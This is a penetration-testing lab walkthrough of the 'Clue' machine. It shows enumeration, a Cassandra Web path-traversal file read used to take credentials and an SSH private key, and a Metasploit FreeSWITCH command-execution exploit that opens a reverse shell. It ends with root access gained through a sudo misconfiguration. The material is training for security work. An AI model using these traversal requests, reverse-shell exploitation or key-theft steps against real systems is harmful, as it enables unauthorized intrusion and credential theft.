##### Walkthrough

# Exploitation Guide for Clue

## Summary:

In this guide, we will take advantage of a Command Execution vulnerability in `Freeswitch Event Socket`. We will escalate privileges by locating a vulnerable SUID binary and using it to gain access to an SSH private key we will use to obtain root access.

## Enumeration

We begin the enumeration process with an `nmap` scan.

```
kali@kali:~$ sudo nmap -sV -sC 192.168.120.155
Nmap scan report for 192.168.120.155
Host is up (0.00058s latency).
Not shown: 994 filtered ports
PORT     STATE  SERVICE          VERSION
22/tcp   open   ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:54:5e:b5:63:4c:22:40:36:26:be:ae:4d:85:dd:7a (RSA)
|   256 1e:fc:44:32:5b:65:eb:a9:4d:1f:e7:f6:6c:06:1a:13 (ECDSA)
|_  256 96:69:d0:1b:0b:af:96:9c:98:a0:29:98:53:d6:f4:af (ED25519)
80/tcp   open   http             Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries
|_/backup /secret
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Home | ClueCon
139/tcp  open   netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open   freeswitch-event FreeSWITCH mod_event_socket
Service Info: Host: CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2022-08-02T08:40:01+07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.84 seconds
```

Viewing the output we see an SMB service with `guest` account enabled on port **445**, the _robots.txt_ and _title_ script on port **80** and **3000**, and the fingerprint service on port **8021**.

We'll begin by interacting with port `8021` using `netcat`.

```
kali@kali:~$ nc 192.168.120.155 8021
Content-Type: auth/request
```

It looks like an HTTP response header with `auth/request` values that indicate some form of authentication might be required. We'll use the `help` command to find more information.

```
...
help

Content-Type: command/reply
Reply-Text: -ERR command not found
...
```

Notice the header values now change to `command/reply` and also added a `Reply-Text` with values `-ERR command not found`. Now we will exit the service.

```
exit

Content-Type: command/reply
Reply-Text: +OK bye
...
See you at ClueCon! http://www.cluecon.com/
```

We notice that the `Reply-Text` returns `+OK` so it's obvious now, the input provided such as `help` or `exit` will be interpreted as a `command`.

Turning to google we eventually find the [following](https://ajgillette.com/wp-content/uploads/2012/12/Freeswitch.pdf#page=12&zoom=auto,-195,590).

Now when visiting the [URL](http://www.cluecon.com/) we find a conference site hosted by the team behind the _FreeSWITCH_ open source project.

Using the knowledge we've obtained so far, a google search for _Freeswitch cluecon default password_ will lead us [here](https://docs.astppbilling.org/itplmars/v5/how-to-change-freeswitch-event-socket-password-6062786.html) and the password is **ClueCon**.

```
kali@kali:~$ nc 192.168.120.155 8021
Content-Type: auth/request

auth ClueCon

Content-Type: command/reply
Reply-Text: -ERR invalid
...
```

The response does not say `-ERR command not found` which means that `auth` command is valid, but looks like the default password is invalid.

We'll take note of our findings and proceed to explore other running services.

## SMB

From our initial scan we found an SMB service on port `445` with a `guest` account enabled.

Let's check that out using `smbclient`.

```
kali@kali:~$ smbclient -N -L 192.168.120.155

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
...
```

The `backup` share is interesting, let's login and see what's in it.

```
kali@kali:~$ smbclient -N //192.168.120.155/backup
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug  1 19:52:53 2022
  ..                                  D        0  Mon Aug  1 19:52:39 2022
  cassandra                           D        0  Fri May  6 22:04:47 2022
  freeswitch                          D        0  Mon Aug  1 19:52:58 2022
...
smb: \> ls freeswitch\*
  .                                   D        0  Mon Aug  1 19:52:58 2022
  ..                                  D        0  Mon Aug  1 19:52:53 2022
  etc                                 D        0  Mon Aug  1 19:52:58 2022
  var                                 D        0  Mon Oct 25 00:26:29 2021
  usr                                 D        0  Mon Oct 25 00:26:29 2021
...
```

The directory names: `cassandra` and `freeswitch` came up in our initial [nmap](https://portal.offsec.com/labs/practice#nmap) initial scan and we have already viewed [netcat](https://portal.offsec.com/labs/practice#netcat). The `Sharename` and the `Comment` also came up. This could potentially be the same `/backup` directory in port 80 ?

```
kali@kali:~$ curl -I http://192.168.120.155/backup/freeswitch
HTTP/1.1 301 Moved Permanently
Date: Tue, 02 Aug 2022 02:44:17 GMT
Server: Apache/2.4.38 (Debian)
Location: http://192.168.120.155/backup/freeswitch/
Content-Type: text/html; charset=iso-8859-1

kali@kali:~$ curl -I http://192.168.120.155/backup/freeswitch/etc/
HTTP/1.1 403 Forbidden
Date: Tue, 02 Aug 2022 02:44:24 GMT
Server: Apache/2.4.38 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

Looks like it is, let's see if we're lucky and can upload something like a webshell.

```
kali@kali:~$ echo hello there > findme.txt
kali@kali:~$ smbclient -N //192.168.120.155/backup
Try "help" to get a list of possible commands.
smb: \> cd freeswitch\etc\
smb: \freeswitch\etc\> put findme.txt
NT_STATUS_ACCESS_DENIED opening remote file \freeswitch\etc\findme.txt
```

From the output we see our access is denied, we'll proceed to mount the share in order to easily explore directories.

```
kali@kali:~$ mkdir backup
kali@kali:~$ sudo mount -t cifs //192.168.120.155/backup backup/ -o guest
kali@kali:~$ cd backup/
kali@kali:~/backup$ ls -l
drwxr-xr-x 2 root root 0 May  6 22:04 cassandra
drwxr-xr-x 2 root root 0 Aug  1 19:52 freeswitch
```

Earlier in [netcat](https://portal.offsec.com/labs/practice#netcat) we needed a valid password for the FreeSWITCH service, specifically the Event Socket.

Let's try looking in the `freeswitch` directory.

```
kali@kali:~/backup# cd freeswitch/
kali@kali:~/backup/freeswitch# ls etc/freeswitch/ -l
total 11264
-rwxr-xr-x 1 root root  2791 Oct 25  2021 README_IMPORTANT.txt
drwxr-xr-x 2 root root     0 Oct 25  2021 autoload_configs
drwxr-xr-x 2 root root     0 Oct 25  2021 chatplan
-rwxr-xr-x 1 root root  2260 Oct 25  2021 config.FS0
-rwxr-xr-x 1 root root   683 Oct 25  2021 extensions.conf
-rwxr-xr-x 1 root root  3209 Oct 25  2021 freeswitch.xml
-rwxr-xr-x 1 root root  1226 Oct 25  2021 fur_elise.ttml
...
kali@kali:~/backup/freeswitch# find . -type f -name "*.xml" -exec grep -nH password {} + | wc -l
120
kali@kali:~/backup/freeswitch# find . -type f -name "*.xml" -exec grep -nH password {} + | grep socket
./etc/freeswitch/autoload_configs/event_socket.conf.xml:6:    <param name="password" value="ClueCon"/>
```

There are 120 XML files containing the word "password" and only one when specifically grep for `socket` which is a default password we already tried [earlier](https://portal.offsec.com/labs/practice#netcat).

However, we take note of the file path which may be useful during the exploitation phase.

## Cassandra Web

Moving on to port `3000` we find a static webpage.

A google search yields a Web interface management for NoSQL databases from [Apache Cassandra](https://cassandra.apache.org) version **3.11.13**.

This web management system is similar to phpMyAdmin and manages MySQL databases which may include similar vulnerabilities.

Let's search known vulnerabilities for Cassandra Web using `searchsploit`

```
kali@kali:~$ searchsploit cassandra web
------------------------------------------------------- -------------------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- -------------------------------------------
Cassandra Web 0.5.0 - Remote File Read                 | linux/webapps/49362.py
------------------------------------------------------- -------------------------------------------
```

Inspecting the script

```
kali@kali:~$ searchsploit -x linux/webapps/49362.py
...
#!/usr/bin/python
...
# Usage
# > cassmoney.py 10.0.0.5 /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
#
# > cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
#
# (these creds are for auth to the running apache cassandra database server)
...
```

We find the following [Metasploit](https://github.com/krastanoel/msf/blob/master/auxiliary/scanner/http/cassandra_web_file_read.rb) module and also find that the vulnerability is also available using `curl`.

```
kali@kali:~$ curl http://192.168.120.155:3000/../../../../../../../../etc/passwd --path-as-is
root:x:0:0:root:/root:/bin/bash
...
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
cassandra:x:108:116:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

We have confirmed that the service is vulnerable. It's important to use the `--path-as-is` option to disable `curl` path normalization.

Let's see if the service command line contains any database credentials.

```
kali@kali:~$ curl http://192.168.120.155:3000/../../../../../../../../proc/self/cmdline --path-as-is
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
kali@kali:~$ curl http://192.168.120.155:3000/../../../../../../../../proc/self/cmdline --path-as-is --output -
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

We notice the arguments contain the username: **cassie** which also exists in `/etc/passwd` and the password: **SecondBiteTheApple330**.

Let's quickly test if these credentias are valid for SSH using `hydra`.

```
kali@kali:~$ hydra -l cassie -p SecondBiteTheApple330 ssh://192.168.120.155
Hydra v9.0 (c) 2019 by van Hauser/THC - ...

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-02 14:00:56
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.120.155:22/
1 of 1 target completed, 0 valid passwords found
```

From the output we see these credentials are not valid. Let's inspect `/etc/ssh/sshd_config`

```
kali@kali:~$ curl http://192.168.120.155:3000/../../../../../../../../etc/ssh/sshd_config --path-as-is
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.
...
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

AllowUsers root anthony
```

We see that only **root** and **anthony** allowed to login via SSH.

Let's take a step back to our previous [Samba backup shares](https://portal.offsec.com/labs/practice#SMB) enumeration.

We'll check if the `event_socket.conf.xml` file exists.

```
kali@kali:~$ curl http://192.168.120.155:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml --path-as-is
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

We find that the file exists and the password is: **StrongClueConEight021**

```
kali@kali:~$ nc 192.168.120.155 8021
Content-Type: auth/request

auth StrongClueConEight021

Content-Type: command/reply
Reply-Text: +OK accepted
```

## Remote Command Execution

Using _Metasploit_ , we find a module that we can use to exploit `freeswitch`.

```
msf6 > search freeswitch

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/multi/misc/freeswitch_event_socket_cmd_exec   2019-11-03       excellent  Yes    FreeSWITCH Event Socket Command Execution
...
```

We begin by checking the requisite options for the module.

```
msf6 > use exploit/multi/misc/freeswitch_event_socket_cmd_exec
[*] Using configured payload cmd/unix/reverse
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > options

Module options (exploit/multi/misc/freeswitch_event_socket_cmd_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  ClueCon          yes       FreeSWITCH event socket password
   RHOSTS                     yes       The target host(s), range CIDR identifier...
   RPORT     8021             yes       The target port (TCP)
...

Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
...
```

The module automatically selects a payload for us so we'll just need to adjust the `RHOSTS`, `LHOST`, `LPORT` and `PASSWORD` options.

```
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set RHOSTS 192.168.120.155
RHOSTS => 192.168.120.155
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set LHOST 192.168.120.3
LHOST => 192.168.120.3
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set LPORT 8021
LPORT => 8021
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set PASSWORD StrongClueConEight021
PASSWORD => StrongClueConEight021
```

Now we are ready to run the module using the `exploit` command.

```
msf6 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > exploit

[*] Started reverse TCP double handler on 192.168.120.3:8021
[*] 192.168.120.155:8021 - Login success
[*] 192.168.120.155:8021 - Sending payload (291 bytes) ...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo qrwRwf3qFSOr7jar;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "qrwRwf3qFSOr7jar\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.120.3:8021 -> 192.168.120.155:44512) at 2022-03-24 19:24:48

id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
```

## Privilege Escalation

There is no clear command prompt when getting a reverse shell using _Metasploit_, so we'll use `script` command to avoid our eyes playing tricks on us.

```
which script
/usr/bin/script
script -qc /bin/bash /dev/null
freeswitch@clue:/$
```

After establishing our foothold, we'll refer back to Cassie's password we obtained during our previous arbitrary file read.

```
freeswitch@clue:/$ su - cassie
Password: SecondBiteTheApple330
cassie@clue:~$ sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```

We have confirmed access and see that we are permitted to run `/usr/local/bin/cassandra-web`.

This is good right because we could leverage the same vulnerability as the **root** user. Let's try to run the same command with username and password with Sudo.

```
cassie@clue:~$ sudo cassandra-web -u cassie -p SecondBiteTheApple330
...
I, [2022-08-02T15:32:01.970556 #3200]  INFO -- : Creating session
I, [2022-08-02T15:32:02.059476 #3200]  INFO -- : Session created
2022-08-02 15:32:02 +0700 Thin web server (v1.8.1 codename Infinite Smoothie)
2022-08-02 15:32:02 +0700 Maximum connections set to 1024
2022-08-02 15:32:02 +0700 Listening on 0.0.0.0:3000, CTRL+C to stop
RuntimeError: no acceptor (port is in use or requires root privileges)

Usage: cassandra-web [options]
    -B, --bind BIND                ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)
    -H, --hosts HOSTS              coma-separated list of cassandra hosts (default: 127.0.0.1)
    -P, --port PORT                integer port that cassandra is running on (default: 9042)
    -L, --log-level LEVEL          log level (default: info)
    -u, --username USER            username to use when connecting to cassandra
    -p, --password PASS            password to use when connecting to cassandra
    ...
```

Unfortunately we receive a `RuntimeError` that port `3000` is in use.

Luckily there is a `-B` option to bind `ip:port` to listen to.

```
cassie@clue:~$ sudo cassandra-web -u cassie -p SecondBiteTheApple330 -B 444
...
I, [2022-08-02T15:49:54.153773 #3366]  INFO -- : Creating session
I, [2022-08-02T15:49:54.243259 #3366]  INFO -- : Session created
2022-08-02 15:49:54 +0700 Thin web server (v1.8.1 codename Infinite Smoothie)
2022-08-02 15:49:54 +0700 Maximum connections set to 1024
2022-08-02 15:49:54 +0700 Listening on 0.0.0.0:444, CTRL+C to stop
```

We notice that the user **anthony** has a `.ssh` directory which appears to be of interest.

```
cassie@clue:~$ ls -l /home/
total 8
drwxr-xr-x 3 anthony anthony 4096 Aug  1 19:53 anthony
drwxr-xr-x 3 cassie  cassie  4096 Aug  2 15:19 cassie
cassie@clue:~$ ls -la /home/anthony/
total 28
drwxr-xr-x 3 anthony anthony 4096 Aug  1 19:53 .
drwxr-xr-x 4 root    root    4096 Aug  1 19:53 ..
-rw------- 1 anthony anthony  120 Aug  1 19:53 .bash_history
-rw-r--r-- 1 anthony anthony  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 anthony anthony 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 anthony anthony  807 Apr 18  2019 .profile
drwx------ 2 anthony anthony 4096 Aug  1 19:53 .ssh
```

Let's see if the `id_rsa` private key file exists.

```
cassie@clue:~$ curl localhost:444/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is
-----BEGIN OPENSSH PRIVATE KEY-----
...
ZwYkNviXUWKJc3nA8VpHj3Sx/K4s5mU6ZtYYmu+sEJqe2tB5tT43BawtQB5Bo8jgpuTvIR
idIGdFy7rGgZjqiHaR5qylpEOh3bwQ68EkyZUNO03yco3SpQd1OK6SmW3ZgsMTKZKzTSOK
IAs9TooaeIR6+r2/AAAADGFudGhvbnlAY2x1ZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

Indeed, the private key exists.

We can attempt to login as `Anthony` with this key.But before that, let's analyze one more interesting file, `.bash_history`.

```
cassie@clue:~$ curl localhost:444/../../../../../../../../home/anthony/.bash_history --path-as-is
clear
ls -la
ssh-keygen
cp .ssh/id_rsa.pub .ssh/authorized_keys
sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys
exit
```

As we can see the public keys are being copied to his SSH directory and also to the **root** SSH directory.

Let's download the private key, set the file permission and then login in as **root**.

```
cassie@clue:~$ curl localhost:444/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is -o id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1823  100  1823    0     0   178k      0 --:--:-- --:--:-- --:--:--  197k
cassie@clue:~$ chmod 600 id_rsa
cassie@clue:~$ ls -l id_rsa
-rw------- 1 cassie cassie 1823 Aug  2 16:40 id_rsa
cassie@clue:~$ ssh -i id_rsa -l root 127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
...
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
root@clue:~# id
uid=0(root) gid=0(root) groups=0(root)
```